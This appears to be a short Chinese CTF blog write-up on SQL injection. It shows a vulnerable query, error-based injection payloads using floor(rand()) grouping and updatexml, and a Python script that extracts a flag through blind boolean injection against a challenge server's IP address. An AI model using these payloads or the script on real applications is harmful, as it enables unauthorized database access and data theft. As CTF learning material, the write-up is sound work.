---
layout: blog
title: slq injection
date: 2019年4月25日10:32:28
tags: CTF sqli
categories: CTF
---

# sqli injection

[注入点](http://202.121.178.79:40003/error/index.php)：
```sql
$sql = "SELECT whatsup FROM error WHERE id='$id' LIMIT 1";
```
<!--more-->
使用方法
## 利用方法
![sqli](https://s4.51cto.com/wyfs02/M00/8C/C3/wKiom1h3ItWCTQzdAAEIxiBGIp0244.png)
```sql
1' and (1,2) in (SELECT count(*), concat(0x3a,(select whatsup from error),floor(rand(0)*2)) name FROM information_schema.tables group by name); --+
```
```sql
1' and updatexml(1, mid(concat(0x3a, (select whatsup from error)), 3, 32),1);--+
``` 

```python
import requests


def get_flag():
    for i in range(1, 64):
        for j in range(33, 127):
            url = 'http://202.121.178.79:40003/bool/index.php?user=1&pass=1\'or ascii(mid((select whatsup from `bool`),' + str(
                i) + ',1))=' + str(j) + ' --+'
            response = requests.get(url, timeout=5)
            if b'something' not in response.content:
                print(chr(j), end='')
                break


if __name__ == '__main__':
    get_flag()
    # x = str(48)
    # print(x)
    # url = 'http://202.121.178.79:40003/bool/index.php?user=1&pass=1\'or ascii(mid((select whatsup from `bool`),' + str(
    #     1) + ',1))=' + x + ' --+'
    # response = requests.get(url, timeout=5)
    # print(response.content)
```



